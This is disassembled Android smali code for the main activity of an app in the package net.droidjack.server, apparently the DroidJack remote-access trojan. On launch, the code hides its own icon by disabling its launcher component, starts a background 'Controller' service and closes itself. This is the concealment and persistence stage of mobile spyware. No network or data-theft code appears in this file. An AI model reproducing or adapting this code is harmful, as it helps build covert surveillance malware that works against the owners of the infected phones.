.class public Lnet/droidjack/server/MainActivity;
.super Landroid/app/Activity;


# instance fields
.field private a:Landroid/widget/Button;

.field private b:I

.field private c:Landroid/content/Intent;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0x539

    iput v0, p0, Lnet/droidjack/server/MainActivity;->b:I

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    const/4 v1, 0x1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    :try_start_0
    sget-byte v0, Lnet/droidjack/server/br;->c:B

    if-ne v0, v1, :cond_0

    invoke-virtual {p0}, Lnet/droidjack/server/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Landroid/content/ComponentName;

    const-class v3, Lnet/droidjack/server/MainActivity;

    invoke-direct {v2, v0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v0, 0x2

    const/4 v3, 0x1

    invoke-virtual {v1, v2, v0, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lnet/droidjack/server/Controller;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lnet/droidjack/server/MainActivity;->c:Landroid/content/Intent;

    iget-object v0, p0, Lnet/droidjack/server/MainActivity;->c:Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lnet/droidjack/server/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Lnet/droidjack/server/MainActivity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    const-wide/16 v0, 0x7d0

    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    :goto_1
    const/high16 v0, 0x7f030000

    :try_start_2
    invoke-virtual {p0, v0}, Lnet/droidjack/server/MainActivity;->setContentView(I)V

    sget-byte v0, Lnet/droidjack/server/br;->c:B

    const/4 v1, -0x1

    if-ne v0, v1, :cond_1

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lnet/droidjack/server/Controller;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lnet/droidjack/server/MainActivity;->c:Landroid/content/Intent;

    const/high16 v0, 0x7f060000

    invoke-virtual {p0, v0}, Lnet/droidjack/server/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lnet/droidjack/server/MainActivity;->a:Landroid/widget/Button;

    iget-object v0, p0, Lnet/droidjack/server/MainActivity;->a:Landroid/widget/Button;

    new-instance v1, Lnet/droidjack/server/bg;

    invoke-direct {v1, p0}, Lnet/droidjack/server/bg;-><init>(Lnet/droidjack/server/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object v0, p0, Lnet/droidjack/server/MainActivity;->c:Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lnet/droidjack/server/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :cond_1
    :goto_2
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v0

    invoke-virtual {p0}, Lnet/droidjack/server/MainActivity;->finish()V

    goto :goto_2
.end method
